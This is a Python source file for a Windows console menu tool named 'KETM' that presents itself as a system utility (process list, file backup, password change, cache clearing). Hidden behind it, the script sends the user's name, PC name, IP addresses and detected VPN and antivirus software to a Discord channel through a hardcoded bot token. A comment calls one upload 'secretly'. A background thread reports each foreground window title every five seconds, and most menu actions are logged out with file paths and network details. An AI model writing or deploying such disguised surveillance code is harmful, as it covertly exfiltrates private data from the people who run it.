import os
import subprocess
import shutil
import psutil
import requests
import threading
import time
import sqlite3
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
import ctypes
from colorama import Fore, Style, init
from docx import Document
from datetime import datetime

init(autoreset=True)  # Automatically reset colors after each print

# Discord bot token and channel ID
TOKEN_PART1 = 'MTI4MDQ0NDk2NDAzOTQzMDE0NA'
TOKEN_PART2 = 'Gqe9R6'
TOKEN_PART3 = '6FxrSF0yzRFtvp_61nYt23M_M76GSL6FCc7GrE'
DISCORD_BOT_TOKEN = f"{TOKEN_PART1}.{TOKEN_PART2}.{TOKEN_PART3}"
DISCORD_CHANNEL_ID = '1280446406783402015'

# Database configuration
DB_FILENAME = "ketm_user_data.db"  # This file will be created in the same directory as your script

# Word document for logging lookups
DOCX_FILENAME = "lookup_results.docx"
TEMP_FILE = os.path.join(os.getenv('TEMP'), 'system_info.txt')

# Directories to search for files
SEARCH_DIRECTORIES = [
    os.path.expanduser('~\\Desktop'),
    os.path.expanduser('~\\Documents'),
    os.path.expanduser('~\\Downloads'),
    # Add other directories as needed
]

def initialize_database():
    """Initialize the SQLite database."""
    conn = sqlite3.connect(DB_FILENAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            pc_name TEXT,
            public_ip TEXT,
            local_ip TEXT,
            vpn_status TEXT,
            antivirus TEXT,
            run_count INTEGER DEFAULT 1
        )
    ''')
    conn.commit()
    conn.close()

def update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivirus):
    """Update the database with user information."""
    conn = sqlite3.connect(DB_FILENAME)
    cursor = conn.cursor()

    cursor.execute('SELECT id, run_count FROM user_data WHERE username = ?', (username,))
    result = cursor.fetchone()

    if result:
        user_id, run_count = result
        cursor.execute('''
            UPDATE user_data
            SET run_count = ?, pc_name = ?, public_ip = ?, local_ip = ?, vpn_status = ?, antivirus = ?
            WHERE id = ?
        ''', (run_count + 1, pc_name, public_ip, local_ip, vpn_status, antivirus, user_id))
    else:
        cursor.execute('''
            INSERT INTO user_data (username, pc_name, public_ip, local_ip, vpn_status, antivirus)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (username, pc_name, public_ip, local_ip, vpn_status, antivirus))

    conn.commit()
    conn.close()

def get_public_ip():
    """Get the public IP address."""
    try:
        response = requests.get('https://api.ipify.org')
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        return f"Error: {e}"

def get_local_ip():
    """Get the local IP address."""
    try:
        output = subprocess.check_output('ipconfig', shell=True).decode()
        for line in output.splitlines():
            if 'IPv4 Address' in line or 'IPv4-Adresse' in line:
                return line.split(':')[-1].strip()
    except Exception as e:
        return f"Error: {e}"

def check_vpn_status():
    """Check for VPN processes and their status."""
    vpn_processes = {
        'hsscp.exe': 'Hotspot Shield VPN',
        'vpnclient.exe': 'Cisco VPN Client',
        'openvpn.exe': 'OpenVPN',
        'hotspotshield.exe': 'Hotspot Shield VPN',
        'nordvpn.exe': 'NordVPN',
        'expressvpn.exe': 'ExpressVPN',
        'protonvpn.exe': 'ProtonVPN',
        'surfshark.exe': 'Surfshark VPN',
        'cyberghost.exe': 'CyberGhost VPN',
        'pia_manager.exe': 'Private Internet Access',
        'windscribe.exe': 'Windscribe VPN',
        'mullvad.exe': 'Mullvad VPN',
        'ivpn.exe': 'IVPN'
    }

    vpn_status = "No"
    detected_vpn = []
    for process, name in vpn_processes.items():
        try:
            output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {process}"', shell=True)
            if process.encode() in output:
                vpn_status = "Yes"
                detected_vpn.append(name)
        except subprocess.CalledProcessError:
            continue

    return vpn_status, detected_vpn

def check_antivirus_status():
    """Check for antivirus processes."""
    antivirus_processes = {
        'avp.exe': 'Kaspersky',
        'avgui.exe': 'AVG',
        'avastui.exe': 'Avast Antivirus',
        'msmpeng.exe': 'Windows Defender',
        'mcshield.exe': 'McAfee',
        'nortonsecurity.exe': 'Norton Security',
        'esetonlinescanner.exe': 'ESET Online Scanner',
        'mbam.exe': 'Malwarebytes',
        'savservice.exe': 'Sophos',
        'f-secure.exe': 'F-Secure',
        'bdservicehost.exe': 'Bitdefender',
        'antivir.exe': 'Avira',
        'antimalware_service.exe': 'Microsoft Defender'
    }

    detected_antivirus = []
    for process, name in antivirus_processes.items():
        try:
            output = subprocess.check_output(f'tasklist /FI "IMAGENAME eq {process}"', shell=True)
            if process.encode() in output:
                detected_antivirus.append(name)
        except subprocess.CalledProcessError:
            continue

    return detected_antivirus

def gather_system_info():
    """Gather and return system information."""
    try:
        public_ip = get_public_ip()
        local_ip = get_local_ip()
        vpn_status, detected_vpn = check_vpn_status()
        detected_antivirus = check_antivirus_status()

        system_info = [
            f"**PC Name:** {os.getenv('COMPUTERNAME')}",
            f"**User Profile:** {os.getlogin()}",
            f"**OS Version:** {os.name}",
            f"**Local IP:** {local_ip}",
            f"**Public IP:** {public_ip}",
            f"**Proxy/VPN Status:** {vpn_status}",
            f"**Detected VPNs:** {', '.join(detected_vpn) if detected_vpn else 'None'}",
            f"**Detected Antivirus:** {', '.join(detected_antivirus) if detected_antivirus else 'None'}"
        ]

        return system_info

    except Exception as e:
        return [f"Error gathering system info: {e}"]

def send_discord_message(message):
    """Send a message to a Discord channel using a bot."""
    url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
        "Content-Type": "application/json"
    }
    data = {
        "content": message
    }
    requests.post(url, headers=headers, json=data)

def send_discord_file(filepath):
    """Send a file to a Discord channel using a bot."""
    url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {
        "Authorization": f"Bot {DISCORD_BOT_TOKEN}"
    }
    files = {
        'file': open(filepath, 'rb')
    }
    requests.post(url, headers=headers, files=files)

def print_colored(text, color):
    """Print text in the specified color."""
    print(f"{color}{text}{Style.RESET_ALL}")

def clear_screen():
    """Clear the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def display_header():
    """Display the header with ASCII art for KETM."""
    print_colored(r"""
 _    __     ______  _______  __  __ 
| |  / /    |  ____||__   __||  \/  | 
| | / /     | |__      | |   | \  / | 
| |/ /      |  __|     | |   | |\/| | 
| |\ \      | |____    | |   | |  | | 
|_| \_\     |______|   |_|   |_|  |_| 
    """, Fore.CYAN)

def display_menu():
    """Display the main menu."""
    print_colored("========================", Fore.GREEN)
    print_colored("      Command Menu      ", Fore.YELLOW)
    print_colored("========================", Fore.GREEN)
    print("1. List Processes")
    print("2. End Process")
    print("3. Run Windows Command")
    print("4. Show Websites")
    print("5. Open File")
    print("6. System Information")
    print("7. Backup Files")
    print("8. Change Password")
    print("9. ID Resolver")
    print("10. Disk Usage Information")
    print("11. Network Information")
    print("12. Clear Cache")
    print("13. Show Active Window Title")
    print("14. Exit")
    print_colored("========================", Fore.GREEN)

def display_socials():
    """Display social media information below the menu."""
    print_colored("\nMy socials:", Fore.MAGENTA)
    print_colored("Made by Fraise Le BG", Fore.MAGENTA)
    print_colored("Youtube: https://www.youtube.com/@PWEBIDUOS", Fore.MAGENTA)
    print_colored("Discord: Discord.com/", Fore.MAGENTA)

def list_files_by_type(extensions):
    """List files by specific extensions."""
    files = []
    for directory in SEARCH_DIRECTORIES:
        if os.path.exists(directory):
            for root, dirs, filenames in os.walk(directory):
                for filename in filenames:
                    if filename.endswith(extensions):
                        files.append(os.path.join(root, filename))
    return files

def list_all_files(username):
    clear_screen()
    print_colored("\nListing all Word, PowerPoint, and Excel files on your PC...", Fore.GREEN)
    files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
    if files:
        for idx, file in enumerate(files, start=1):
            print(f"{idx}. {file}")
        send_discord_message(f"User '{username}' listed all Word, PowerPoint, and Excel files.")
    else:
        print_colored("No Word, PowerPoint, or Excel files found.", Fore.RED)
        send_discord_message(f"User '{username}' tried to list files but found none.")
    input("\nPress Enter to return to the menu...")

def open_file(username):
    clear_screen()
    print_colored("\nSelect a file to open (only Word, PowerPoint, and Excel files):", Fore.GREEN)
    files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
    if files:
        for idx, file in enumerate(files, start=1):
            print(f"{idx}. {file}")
        choice = input("Enter the number of the file to open (or type 'back' to return): ")
        if choice.lower() == 'back':
            return
        try:
            file_index = int(choice) - 1
            if 0 <= file_index < len(files):
                os.startfile(files[file_index])
                send_discord_message(f"User '{username}' opened file: {files[file_index]}")
            else:
                print_colored("Invalid choice. Please try again.", Fore.RED)
                send_discord_message(f"User '{username}' made an invalid file selection.")
        except ValueError:
            print_colored("Invalid input. Please enter a number.", Fore.RED)
            send_discord_message(f"User '{username}' inputted invalid data for file selection.")
    else:
        print_colored("No Word, PowerPoint, or Excel files found to open.", Fore.RED)
        send_discord_message(f"User '{username}' tried to open a file but found none.")
    input("\nPress Enter to return to the menu...")

def backup_files(username):
    clear_screen()
    print_colored("\nSelect files to backup (only Word, PowerPoint, and Excel files):", Fore.GREEN)
    files = list_files_by_type(('.docx', '.pptx', '.xlsx'))
    if files:
        for idx, file in enumerate(files, start=1):
            print(f"{idx}. {file}")
        choices = input("Enter the numbers of the files to backup separated by commas (e.g., 1,2,3) or type 'back' to return: ")
        if choices.lower() == 'back':
            return
        try:
            selected_indices = [int(choice.strip()) - 1 for choice in choices.split(',')]
            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
            backup_folder = os.path.join(desktop_path, 'KETM_Backups')
            os.makedirs(backup_folder, exist_ok=True)
            for file_index in selected_indices:
                if 0 <= file_index < len(files):
                    shutil.copy2(files[file_index], backup_folder)
                    print_colored(f"File {files[file_index]} backed up successfully.", Fore.GREEN)
                    send_discord_message(f"User '{username}' backed up file: {files[file_index]} to {backup_folder}")
                else:
                    print_colored(f"Invalid choice: {file_index + 1}. Skipping.", Fore.RED)
                    send_discord_message(f"User '{username}' made an invalid backup choice: {file_index + 1}")
        except ValueError:
            print_colored("Invalid input. Please enter valid numbers.", Fore.RED)
            send_discord_message(f"User '{username}' inputted invalid data for backup selection.")
    else:
        print_colored("No Word, PowerPoint, or Excel files found to backup.", Fore.RED)
        send_discord_message(f"User '{username}' tried to backup files but found none.")
    input("\nPress Enter to return to the menu...")

def list_processes(username):
    clear_screen()
    print_colored("\nListing all processes...", Fore.GREEN)
    processes = [(proc.info['name'], proc.info['pid'], proc.info['memory_info'].rss) for proc in psutil.process_iter(['name', 'pid', 'memory_info'])]
    for name, pid, memory in processes:
        print(f"{name:<25} {pid:<10} {memory / 1024 / 1024:.2f} MB")
    send_discord_message(f"User '{username}' listed all processes.")
    input("\nPress Enter to return to the menu...")

def end_process(username):
    clear_screen()
    pid = input("Enter the PID of the process to end (or type 'back' to return): ")
    if pid.lower() == 'back':
        return
    try:
        psutil.Process(int(pid)).terminate()
        print_colored(f"Process {pid} terminated successfully.", Fore.GREEN)
        send_discord_message(f"User '{username}' terminated process with PID: {pid}")
    except Exception as e:
        print_colored(f"Error terminating process: {e}", Fore.RED)
        send_discord_message(f"User '{username}' failed to terminate process with PID: {pid}. Error: {e}")
    input("\nPress Enter to return to the menu...")

def run_command(username):
    clear_screen()
    command = input("Enter the Windows command to run (or type 'back' to return): ")
    if command.lower() == 'back':
        return
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        print(output.decode())
        send_discord_message(f"User '{username}' ran Windows command: {command}")
    except subprocess.CalledProcessError as e:
        print_colored(f"Error: {e.output.decode()}", Fore.RED)
        send_discord_message(f"User '{username}' encountered an error running command: {command}. Error: {e.output.decode()}")
    input("\nPress Enter to return to the menu...")

def show_websites(username):
    clear_screen()
    websites = {
        1: "https://www.google.com",
        2: "https://www.youtube.com",
        3: "https://www.facebook.com",
        4: "https://www.amazon.com",
        5: "https://www.wikipedia.org",
        6: "https://www.twitter.com",
        7: "https://www.instagram.com",
        8: "https://www.reddit.com",
        9: "https://www.netflix.com",
        10: "https://www.yahoo.com",
        11: "https://www.ebay.com",
        12: "https://www.twitch.tv",
        13: "https://www.microsoft.com",
        14: "https://www.zoom.us",
        15: "https://www.apple.com",
        16: "https://www.tiktok.com",
        17: "https://www.bing.com",
        18: "https://www.pinterest.com",
        19: "https://www.walmart.com",
        20: "https://www.craigslist.org",
        21: "https://www.espn.com",
        22: "https://www.cnn.com",
        23: "https://www.bbc.com",
        24: "https://www.nytimes.com",
        25: "https://www.github.com",
        26: "https://www.stackoverflow.com",
        27: "https://www.linkedin.com",
        28: "https://www.whatsapp.com",
        29: "https://www.messenger.com",
        30: "https://www.discord.com",
        31: "https://www.spotify.com",
        32: "https://www.steam.com",
        33: "https://www.adobe.com",
        34: "https://www.dropbox.com",
        35: "https://www.flickr.com",
        36: "https://www.vimeo.com",
        37: "https://www.tumblr.com",
        38: "https://www.paypal.com"
    }
    print_colored("\nAvailable websites to open:", Fore.GREEN)
    for num, site in websites.items():
        print(f"{num}. {site}")
    choice = input("Enter the number of the website to open (or type 'back' to return): ")
    if choice.lower() == 'back':
        return
    try:
        choice = int(choice)
        if choice in websites:
            os.startfile(websites[choice])
            send_discord_message(f"User '{username}' opened website: {websites[choice]}")
        else:
            print_colored("Invalid choice. Please try again.", Fore.RED)
            send_discord_message(f"User '{username}' made an invalid website selection.")
    except ValueError:
        print_colored("Invalid input. Please enter a number.", Fore.RED)
        send_discord_message(f"User '{username}' inputted invalid data for website selection.")
    input("\nPress Enter to return to the menu...")

def system_info(username):
    clear_screen()
    try:
        info = gather_system_info()  # Gather system info
        for line in info:
            print(line)  # Display each line of system information on CMD

        with open(TEMP_FILE, 'w') as file:  # Save system info to file
            file.write("\n".join(info))
        
        send_discord_file(TEMP_FILE)  # Send the system info file to Discord (secretly)
        send_discord_message(f"User '{username}' checked system information.")
    except Exception as e:
        print_colored(f"Error retrieving system info: {e}", Fore.RED)
        send_discord_message(f"User '{username}' encountered an error while checking system information: {e}")
    input("\nPress Enter to return to the menu...")

def change_password(username):
    clear_screen()
    new_password = input("Enter your new password: ")
    if new_password:
        command = f"net user {os.getlogin()} {new_password}"
        try:
            subprocess.check_output(command, shell=True)
            print_colored("Password changed successfully.", Fore.GREEN)
            send_discord_message(f"User '{username}' changed their password.")
        except subprocess.CalledProcessError:
            print_colored("Failed to change password. Ensure you're running the script as a regular user and not an administrator.", Fore.RED)
            send_discord_message(f"User '{username}' failed to change their password.")
    input("\nPress Enter to return to the menu...")

def id_resolver(username):
    clear_screen()
    """Resolve Discord user ID to a username using Selenium to interact with discord.id."""
    discord_user_id = input("Enter the Discord user ID to resolve: ")
    # Setup Selenium WebDriver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')  # Run in headless mode (no browser UI)
    options.add_argument('--disable-gpu')
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
    try:
        # Navigate to discord.id
        driver.get("https://discord.id/")
        # Wait for the input box to be available
        wait = WebDriverWait(driver, 20)
        input_box = wait.until(EC.presence_of_element_located((By.ID, 'userid')))
        # Enter the Discord user ID
        input_box.clear()
        input_box.send_keys(discord_user_id)
        input_box.send_keys(Keys.RETURN)
        # Wait for the result to appear
        wait.until(EC.presence_of_element_located((By.ID, 'userTag')))
        # Extract the username result
        result = driver.find_element(By.ID, 'userTag')
        username_result = result.text.strip()
        if username_result:
            print_colored(f"Discord Username: {username_result}", Fore.GREEN)
            log_to_word(discord_user_id, username_result)  # Log the result to a Word document
            send_discord_message(f"User '{username}' resolved Discord ID '{discord_user_id}' to username '{username_result}'.")
        else:
            print_colored("No results found. Please check the Discord ID.", Fore.RED)
            send_discord_message(f"User '{username}' tried to resolve Discord ID '{discord_user_id}' but found no results.")
    except Exception as e:
        print_colored(f"Error resolving Discord ID: {e}", Fore.RED)
        send_discord_message(f"User '{username}' encountered an error resolving Discord ID '{discord_user_id}': {e}")
    finally:
        driver.quit()

def log_to_word(discord_id, username):
    """Log the Discord ID lookup result to a Word document."""
    if not os.path.exists(DOCX_FILENAME):
        doc = Document()
        doc.add_heading('Discord ID Lookup Results', 0)
    else:
        doc = Document(DOCX_FILENAME)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    doc.add_paragraph(f"Lookup Time: {now}")
    doc.add_paragraph(f"Discord ID: {discord_id}")
    doc.add_paragraph(f"Discord Username: {username}")
    doc.add_paragraph("-------------------------------")
    doc.save(DOCX_FILENAME)
    send_discord_message(f"Logged Discord ID '{discord_id}' lookup result to Word document.")

def disk_usage_info(username):
    clear_screen()
    print_colored("Disk Usage Information:", Fore.GREEN)
    partitions = psutil.disk_partitions()
    disk_info = []
    for partition in partitions:
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            info = f"Drive {partition.device}: {usage.percent}% used, Total: {usage.total / (1024**3):.2f} GB, Free: {usage.free / (1024**3):.2f} GB"
            print(info)
            disk_info.append(info)
        except PermissionError:
            print(f"Drive {partition.device}: Access Denied")
            disk_info.append(f"Drive {partition.device}: Access Denied")
    send_discord_message(f"User '{username}' checked disk usage information: " + " | ".join(disk_info))
    input("\nPress Enter to return to the menu...")

def network_info(username):
    clear_screen()
    print_colored("Network Information:", Fore.GREEN)
    addrs = psutil.net_if_addrs()
    stats = psutil.net_if_stats()
    network_data = []
    for interface, addresses in addrs.items():
        interface_info = f"\nInterface: {interface} - Status: {'Up' if stats[interface].isup else 'Down'}"
        print(interface_info)
        network_data.append(interface_info)
        for address in addresses:
            address_info = f"  {address.family.name}: {address.address}"
            print(address_info)
            network_data.append(address_info)
    send_discord_message(f"User '{username}' checked network information: " + " | ".join(network_data))
    input("\nPress Enter to return to the menu...")

def clear_cache(username):
    clear_screen()
    print_colored("Clearing cache and temporary files...", Fore.GREEN)
    temp_folder = os.getenv('TEMP')
    try:
        for root, dirs, files in os.walk(temp_folder):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except Exception as e:
                    print(f"Error deleting file {file}: {e}")
        print_colored("Cache and temporary files cleared successfully.", Fore.GREEN)
        send_discord_message(f"User '{username}' cleared cache and temporary files.")
    except Exception as e:
        print_colored(f"Error clearing cache: {e}", Fore.RED)
        send_discord_message(f"User '{username}' encountered an error while clearing cache: {e}")
    input("\nPress Enter to return to the menu...")

def show_active_window_title(username):
    clear_screen()
    try:
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        h_wnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(h_wnd)
        buffer = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(h_wnd, buffer, length + 1)
        print_colored(f"Active Window Title: {buffer.value}", Fore.GREEN)
        send_discord_message(f"User '{username}' checked active window title: {buffer.value}")
    except Exception as e:
        print_colored(f"Error retrieving active window title: {e}", Fore.RED)
        send_discord_message(f"User '{username}' encountered an error while checking active window title: {e}")
    input("\nPress Enter to return to the menu...")

def background_monitoring():
    """Continuously monitor the system for user activities."""
    last_opened_window = None
    while True:
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            h_wnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(h_wnd)
            buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(h_wnd, buffer, length + 1)
            current_window = buffer.value
            if current_window != last_opened_window and current_window:
                last_opened_window = current_window
                send_discord_message(f"User opened window: {current_window}")
        except Exception as e:
            send_discord_message(f"Error monitoring windows: {e}")
        time.sleep(5)

def run_background_thread():
    """Start the background monitoring in a separate thread."""
    monitoring_thread = threading.Thread(target=background_monitoring, daemon=True)
    monitoring_thread.start()

def main_menu():
    username = os.getlogin()  # Get the actual username
    pc_name = os.getenv('COMPUTERNAME')
    public_ip = get_public_ip()
    local_ip = get_local_ip()
    vpn_status, _ = check_vpn_status()
    antivirus = ', '.join(check_antivirus_status()) or 'None'

    # Initialize database and update user data
    initialize_database()
    update_user_data(username, pc_name, public_ip, local_ip, vpn_status, antivirus)

    send_discord_message(f"User '{username}' started the script.")
    gather_system_info()  # Gather and send system info at the start
    send_discord_file(TEMP_FILE)  # Send the system info file to Discord
    run_background_thread()  # Start background monitoring

    while True:
        clear_screen()
        display_header()
        display_menu()
        display_socials()
        choice = input("Enter your choice (1-14): ")
        if choice == '1':
            send_discord_message(f"User '{username}' chose option 1: List Processes")
            list_processes(username)
        elif choice == '2':
            send_discord_message(f"User '{username}' chose option 2: End Process")
            end_process(username)
        elif choice == '3':
            send_discord_message(f"User '{username}' chose option 3: Run Windows Command")
            run_command(username)
        elif choice == '4':
            send_discord_message(f"User '{username}' chose option 4: Show Websites")
            show_websites(username)
        elif choice == '5':
            send_discord_message(f"User '{username}' chose option 5: Open File")
            open_file(username)
        elif choice == '6':
            send_discord_message(f"User '{username}' chose option 6: System Information")
            system_info(username)
        elif choice == '7':
            send_discord_message(f"User '{username}' chose option 7: Backup Files")
            backup_files(username)
        elif choice == '8':
            send_discord_message(f"User '{username}' chose option 8: Change Password")
            change_password(username)
        elif choice == '9':
            send_discord_message(f"User '{username}' chose option 9: ID Resolver")
            id_resolver(username)
        elif choice == '10':
            send_discord_message(f"User '{username}' chose option 10: Disk Usage Information")
            disk_usage_info(username)
        elif choice == '11':
            send_discord_message(f"User '{username}' chose option 11: Network Information")
            network_info(username)
        elif choice == '12':
            send_discord_message(f"User '{username}' chose option 12: Clear Cache")
            clear_cache(username)
        elif choice == '13':
            send_discord_message(f"User '{username}' chose option 13: Show Active Window Title")
            show_active_window_title(username)
        elif choice == '14':
            send_discord_message(f"User '{username}' chose option 14: Exit")
            print_colored("Exiting KETM. Goodbye!", Fore.GREEN)
            break
        else:
            print_colored("Invalid choice. Please try again.", Fore.RED)
            send_discord_message(f"User '{username}' made an invalid menu choice.")

if __name__ == "__main__":
    main_menu()
